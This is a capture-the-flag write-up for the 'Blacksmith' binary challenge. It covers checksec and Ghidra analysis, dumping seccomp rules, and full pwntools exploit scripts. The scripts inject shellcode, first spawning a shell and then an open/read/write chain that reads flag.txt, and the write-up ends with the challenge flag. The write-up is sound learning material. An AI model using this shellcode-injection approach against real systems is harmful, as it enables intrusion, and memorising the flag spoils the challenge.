# Blacksmith
> Write-up author: jon-brandy
## DESCRIPTION:
You are the only one who is capable of saving this town and bringing peace upon this land! 
You found a blacksmith who can create the most powerful weapon in the world! You can find him under the label "./flag.txt".
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209630413-478b7d78-09af-4f9c-adb6-5639252b1a44.png)


2. Check the file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209630465-9cf4b060-c9ec-44bd-9436-09c5ee7bf3fd.png)


3. Since it's a binary file, now check the the binary's protection.

> RESULT - NX DISABLED (Means we can inject shellcode and is allowed to execute it)

![image](https://user-images.githubusercontent.com/70703371/209630701-82e94e29-1116-4e00-b851-0ab925d72e7b.png)


4. Let's decompile the binary using ghidra.

> RESULT - MAIN FUNCTION

![image](https://user-images.githubusercontent.com/70703371/209918543-54eae053-c967-46a9-b0fc-94e07cb27295.png)


5. Based from the `main()` function, we know that the program will prompts us an input.
6. If we input 1, then the program will print `&DAT_001012e0`, which allows us to choose another input.

![image](https://user-images.githubusercontent.com/70703371/209918798-9988c6f5-1c2a-4d90-9510-a948e7a4a395.png)


7. If we choose 2, the program will call the `shield()` function, 3 for the `bow()` function and 1 for the `sword()` function.

![image](https://user-images.githubusercontent.com/70703371/209918965-f1009b6a-0b41-4683-b1c6-a1015d91228a.png)


8. Let's deep dive to those 3 functions.

> SHIELD()

![image](https://user-images.githubusercontent.com/70703371/209919253-3f59e1e5-8dfd-4e5d-a975-84fa1cfa2a1f.png)


9. At the `shield()` we know that there's no bufferoverflow vuln, but we are given direct code execution.

![image](https://user-images.githubusercontent.com/70703371/209919389-24aa76b8-184b-4706-9d69-e36fef5d3a8a.png)


> BOW()

![image](https://user-images.githubusercontent.com/70703371/209919443-e50884ed-948b-4873-8fcb-7bcd6f38040f.png)


10. Nothing interesting here, let's check the `sword()` function.

> SWORD()

![image](https://user-images.githubusercontent.com/70703371/209919499-b22ae996-ccca-43b4-b32e-15541bd3e7d1.png)


11. Still the same, hence let's go back to the `shield()` function.
12. Now let's run `chmod` to the binary then run the it in gdb.

> RESULT - PRESS 1

![image](https://user-images.githubusercontent.com/70703371/209919782-bf81c2f4-74b0-487e-834e-398d96fd70c1.png)


13. Choose for the shield.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209919853-ef3c5cf4-19a9-4746-8c32-340ca4894418.png)


4. Input any strings.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209919925-188f792b-84e6-4e4b-a9fb-04ffe927c1aa.png)


5. Got segmentation fault here, it happens not because we overflowed the buffer, because what we enter will be executed as code which is not valid.
6. Hence our here is our temporary script.

> TEMPS SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './blacksmith'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

# we are using shellcraft, because it's just executing code.
shellcode = asm(shellcraft.sh())

sh.sendlineafter('>', b'1')
sh.sendlineafter('>', b'2')
sh.sendlineafter('>', flat(shellcode))

sh.interactive()

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/209923261-c7d55058-e321-45d1-ac03-acd3abc8b938.png)


7. Let's use `shellcraft.cat` since the desc said that the flag is under /flag.txt`. Change the **sh.interactive()** to this:

```py
getFlag = sh.recv()
success(getFlag)
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209923541-98fceec9-b681-45a8-94ac-e745172449b2.png)


8. Based from the output we got, i think there's `seccomp` protections.

> SECCOMP

```
Secure computing mode ( seccomp ) is a Linux kernel feature. You can use it to restrict the actions available within the container. The seccomp() system call operates on the seccomp state of the calling process. You can use this feature to restrict your application's access.
```

9. To validate our assumption, let's run `ldd` to the binary.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209923976-64bd2bdf-d971-42fd-af2b-cffea9574730.png)


10. Yepp, we're right.
11. Now let's dump the rule using `seccomp-tools`.

```
sudo seccomp-tools dump ./blacksmith
```

> RESULT - (CHOOSE 1 THEN 2)

![image](https://user-images.githubusercontent.com/70703371/209924543-f1e7e948-7104-4b98-8fb0-69809a379b91.png)


12. Based from the rules, the binary allows to use `read()`, `write()` , and `open()`.
13. That's why when we use cat or get into the shell, the program terminated.
14. So, the flow we shall use is, using the `open()` function to open the flag, then use the `read()` function to read the flag , and use the `write()` write the flag to the standard output.
15. Now let's update our script:

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './blacksmith'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

# we are using shellcraft, because it's just executing code.
#shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.open('flag.txt'))
# ssize_t read(int fildes, void *buf, size_t nbyte);
# int fildes value -> 3, because we want to read from a file | check linux man pages -> die.net (num2 - read)
# void*buf -> rsp, because we want to read it to the stack
# size_t nbyte -> since the flag won't be too long, input any bytes size.
shellcode += asm(shellcraft.read(3, 'rsp', 50))
# ssize_t write(int fildes, const void *buf, size_t nbyte);
# int fildes -> 1 , because we want to send message to out standard output (another user) | check linux man pages -> die.net (num1 - write)
shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))

sh.sendlineafter('>', '1')
sh.sendlineafter('>', '2')
sh.sendlineafter('>', flat(shellcode))

# Need to add these lines of script, dunno why if exclude it, won't get the flag.
sh.recv()
#sh.interactive()
getFlag = sh.recv()
success(getFlag)

```

16. Let's test it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209930928-d3b56da7-04e4-48de-a396-0d3c0b9eeda3.png)


17. Got the flag!

## FLAG

```
HTB{s3cc0mp_1s_t00_s3cur3}
```


##### NOTES:

1. To check available shellcraft function.
2. Run this on ur terminal:

```sh
pwn shellcraft -l | grep linux
```

## LEARNING REFERENCES:

```
https://docs.docker.com/engine/security/seccomp/
https://www.die.net/search/?q=read&sa=Search&ie=ISO-8859-1&cx=partner-pub-5823754184406795%3A54htp1rtx5u&cof=FORID%3A9&siteurl=linux.die.net%2Fman%2F&ref=www.google.com%2F&ss=238j25750j4#gsc.tab=0&gsc.q=read&gsc.page=1
```
